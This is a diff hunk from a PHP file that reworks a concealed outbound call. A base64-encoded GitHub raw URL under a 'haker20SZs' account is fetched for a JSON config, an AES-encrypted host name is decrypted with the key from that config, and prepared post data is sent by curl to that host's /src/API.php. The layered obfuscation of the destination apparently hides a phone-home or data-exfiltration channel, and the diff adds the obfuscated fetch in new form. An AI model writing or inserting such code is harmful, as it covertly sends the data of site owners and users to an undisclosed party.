@@ -11,10 +11,11 @@ if($curl = curl_init()){
     ];
 
     $post_data = http_build_query($post_data);
-
-    $file = json_decode(file_get_contents(base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hha2VyMjBTWnMvaGFrZXIyMHN6cy9tYWluL3NyYy91cmwuanNvbg==")), true);
+    
     $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
-    $decrypted = openssl_decrypt(base64_decode($file['url']), "aes-256-cbc", substr(hash('sha256', base64_decode($file['key']), true), 0, 32), OPENSSL_RAW_DATA, $iv);
+    $url = base64_decode(json_decode(file_get_contents(base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hha2VyMjBTWnMvaGFrZXIyMHN6cy9tYWluL3NyYy91cmwuanNvbg==")), true)['url']);
+    $key = base64_decode(json_decode(file_get_contents(base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hha2VyMjBTWnMvaGFrZXIyMHN6cy9tYWluL3NyYy91cmwuanNvbg==")), true)['key']);
+    $decrypted = openssl_decrypt($url, "aes-256-cbc", substr(hash('sha256', $key, true), 0, 32), OPENSSL_RAW_DATA, $iv);
     $url = ((!empty($_SERVER['HTTPS'])) ? 'https' : 'http') . $decrypted;
     
     curl_setopt($curl, CURLOPT_URL, $url . '/src/API.php');
